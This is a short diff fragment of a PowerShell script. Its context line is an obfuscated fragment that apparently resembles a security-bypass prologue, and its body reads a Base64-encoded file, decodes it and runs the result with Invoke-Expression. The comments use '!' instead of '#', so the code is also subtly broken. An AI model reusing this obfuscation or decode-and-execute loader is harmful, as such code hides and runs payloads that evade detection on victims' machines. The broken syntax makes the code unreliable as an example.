@@ -36,16 +36,21 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 =============================================================
 
 ! Define the path to the text file containing the Base64-encoded PowerShell commands
+
 $encodedFilePath = "path\to\your\encodedfile.txt"
 
 ! Read the Base64-encoded content from the text file
+
 $encodedContent = Get-Content -Path $encodedFilePath
 
 ! Decode the Base64-encoded content
+
 $decodedBytes = [System.Convert]::FromBase64String($encodedContent)
+
 $decodedContent = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
 
 ! Execute the decoded PowerShell commands
+
 Invoke-Expression $decodedContent
 
 
